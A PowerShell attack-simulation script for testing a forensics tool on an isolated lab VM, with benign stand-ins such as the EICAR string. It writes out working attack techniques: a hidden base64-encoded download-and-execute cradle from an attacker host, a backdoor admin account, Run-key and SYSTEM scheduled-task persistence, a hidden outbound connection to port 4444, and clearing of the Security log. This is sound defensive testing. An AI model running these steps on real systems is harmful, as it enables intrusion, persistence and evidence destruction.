<#
.SYNOPSIS
  ForenSight lab attack simulation (PRD section 9.2), steps 3-8. Run ONLY on your own isolated lab VM
  (host-only network, clean snapshot taken first). Uses harmless stand-ins: EICAR test string, netcat listener.

.EXAMPLE
  # On Victim-WIN, as the 'admin' account, after steps 1-2 were run from Kali (see attacker.sh):
  powershell -ExecutionPolicy Bypass -File .\attack.ps1 -Steps 3,4,5,6,7,8 -Attacker 192.168.56.20

.NOTES
  Judges pick the steps (US-014): any subset of 3..8 works independently. Each step prints a UTC timestamp
  that you can compare with the ForenSight timeline (timeline accuracy metric).
#>
param(
  [int[]]$Steps = @(3,4,5,6,7,8),
  [string]$Attacker = "192.168.56.20",
  [int]$C2Port = 4444,
  [switch]$Cleanup
)
$ErrorActionPreference = "Continue"
$Drop  = Join-Path $env:TEMP "updater.exe"
$UpPs1 = "C:\Users\Public\up.ps1"

function Log($n, $msg) { Write-Host ("[{0:yyyy-MM-ddTHH:mm:ss.fffZ}] step {1}: {2}" -f (Get-Date).ToUniversalTime(), $n, $msg) -ForegroundColor Cyan }

function Step3 {  # Encoded PowerShell that downloads a test file (T1059.001, T1105)
  $cmd = "IEX (New-Object Net.WebClient).DownloadString('http://$Attacker`:8000/update.ps1')"
  $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
  Log 3 "powershell -enc (download cradle from $Attacker`:8000)"
  Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -enc $enc" -WindowStyle Hidden
}
function Step4 {  # Drop the EICAR test file in %TEMP% (T1105) - harmless, detected by every AV
  $eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
  [IO.File]::WriteAllText($Drop, $eicar)
  Log 4 "EICAR written to $Drop (add a lab-only Defender exclusion for %TEMP% or Defender will quarantine it)"
}
function Step5 {  # New user + admin group (T1136, T1098)
  net user support_backup 'P@ssw0rd!2026' /add | Out-Null
  net localgroup administrators support_backup /add | Out-Null
  Log 5 "user support_backup created and added to Administrators"
}
function Step6 {  # Run key + scheduled task (T1547.001, T1053.005)
  Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdater" -Value $Drop
  "Write-Output 'lab persistence placeholder'" | Out-File -Encoding ascii $UpPs1
  schtasks /create /tn "UpdaterTask" /tr "powershell.exe -W Hidden -NoP -File $UpPs1" /sc onlogon /ru SYSTEM /f | Out-Null
  Log 6 "Run key WindowsUpdater + scheduled task UpdaterTask"
}
function Step7 {  # Outbound connection to Kali:4444 (T1071). Start 'nc -lvnp 4444' on Kali first.
  $script = "`$c=New-Object Net.Sockets.TCPClient('$Attacker',$C2Port);`$s=`$c.GetStream();Start-Sleep 600"
  Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -c `"$script`"" -WindowStyle Hidden
  Log 7 "connection to $Attacker`:$C2Port opened (kept open 10 minutes so collection sees it)"
}
function Step8 {  # Clear the Security log (T1070.001)
  wevtutil cl Security
  Log 8 "Security log cleared (earlier 4625/4624/4720/4732/4698 records are now gone - ForenSight recovers them from other sources)"
}

if ($Cleanup) {
  net user support_backup /delete 2>$null | Out-Null
  Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdater" -ErrorAction SilentlyContinue
  schtasks /delete /tn "UpdaterTask" /f 2>$null | Out-Null
  Remove-Item $Drop, $UpPs1 -ErrorAction SilentlyContinue
  Write-Host "Cleanup done. Prefer reverting the VM snapshot." ; return
}
foreach ($n in ($Steps | Sort-Object)) {
  if ($n -lt 3 -or $n -gt 8) { Write-Warning "Step $n runs from the attacker VM (see attacker.sh)"; continue }
  & "Step$n"; Start-Sleep -Seconds 20
}
